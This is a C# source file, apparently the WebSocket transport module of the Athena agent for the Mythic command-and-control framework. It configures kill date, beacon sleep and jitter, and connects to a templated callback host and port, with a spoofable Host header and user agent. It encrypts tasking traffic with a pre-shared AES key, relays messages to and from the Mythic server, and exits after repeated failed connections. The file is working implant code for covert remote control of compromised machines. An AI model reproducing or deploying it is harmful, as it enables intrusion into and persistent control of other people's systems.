﻿using Athena.Models;
using Athena.Models.Config;
using Athena.Utilities;
using System.Text.Json;
using System;
using System.IO;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Athena.Models.Mythic.Checkin;
using System.Text.Json.Serialization;
using System.Text.Json.Serialization.Metadata;
using System.Diagnostics;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile profile { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }

        public Config()
        {
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.profile = new Websocket();
        }
    }

    public class Websocket : IProfile
    {
        public string uuid { get; set; }
        public string psk { get; set; }
        public string endpoint { get; set; }
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public ClientWebSocket ws { get; set; }
        public PSKCrypto crypt { get; set; }
        public bool encrypted { get; set; }
        public int connectAttempts { get; set; }
        public string url { get; set; }

        public Websocket()
        {
            int callbackPort = Int32.Parse("callback_port");
            string callbackHost = "callback_host";
            this.endpoint = "ENDPOINT_REPLACE";
            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
            this.userAgent = "USER_AGENT";
            this.hostHeader = "%HOSTHEADER%";
            this.psk = "AESPSK";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.uuid = "%UUID%";
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            this.ws = new ClientWebSocket();

            if (!String.IsNullOrEmpty(this.hostHeader))
            {
                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
            }
        }

        public async Task<bool> Connect(string url)
        {
            this.connectAttempts = 0;
            try
            {
                ws = new ClientWebSocket();
                await ws.ConnectAsync(new Uri(url), CancellationToken.None);

                while (ws.State != WebSocketState.Open)
                {
                    if (this.connectAttempts == 300)
                    {
                        Environment.Exit(0);
                    }
                    await Task.Delay(3000);
                    this.connectAttempts++;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public async Task<string> Send(string json)
        {
            if(this.ws.State != WebSocketState.Open)
            {
                Debug.WriteLine($"[{DateTime.Now}] Lost socket connection, attempting to re-establish.");
                await Connect(this.url);
            }

            Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");

            try
            {
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                WebSocketMessage m = new WebSocketMessage()
                {
                    client = true,
                    data = json,
                    tag = String.Empty
                };

                string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
                byte[] msg = Encoding.UTF8.GetBytes(message);
                Debug.WriteLine($"[{DateTime.Now}] Sending Message and waiting for resopnse.");
                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                message = await Receive(ws);

                if (String.IsNullOrEmpty(message))
                {
                    Debug.WriteLine($"[{DateTime.Now}] Response was empty.");
                    return String.Empty;
                }

                m = JsonSerializer.Deserialize<WebSocketMessage>(message, WebsocketJsonContext.Default.WebSocketMessage);

                if (this.encrypted)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(m.data)}");
                    return this.crypt.Decrypt(m.data);
                }

                if (!string.IsNullOrEmpty(json))
                {
                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(m.data).Result.Substring(36)}");
                    return (await Misc.Base64Decode(m.data)).Substring(36);
                }

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
        static async Task<string> Receive(ClientWebSocket socket)
        {
            try
            {
                var buffer = new ArraySegment<byte>(new byte[2048]);
                do
                {
                    WebSocketReceiveResult result;
                    using (var ms = new MemoryStream())
                    {
                        do
                        {
                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                            await ms.WriteAsync(buffer.Array, buffer.Offset, result.Count);
                        } while (!result.EndOfMessage);

                        if (result.MessageType == WebSocketMessageType.Close)
                            break;

                        ms.Seek(0, SeekOrigin.Begin);
                        using (var reader = new StreamReader(ms, Encoding.UTF8))
                            return (await reader.ReadToEndAsync());
                    }

                } while (true);

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
    }
    public class WebSocketMessage
    {
        public bool client { get; set; }
        public string data { get; set; }
        public string tag { get; set; }
    }

    [JsonSerializable(typeof(WebSocketMessage))]
    [JsonSerializable(typeof(string))]
    [JsonSerializable(typeof(bool))]
    public partial class WebsocketJsonContext : JsonSerializerContext
    {
    }
}
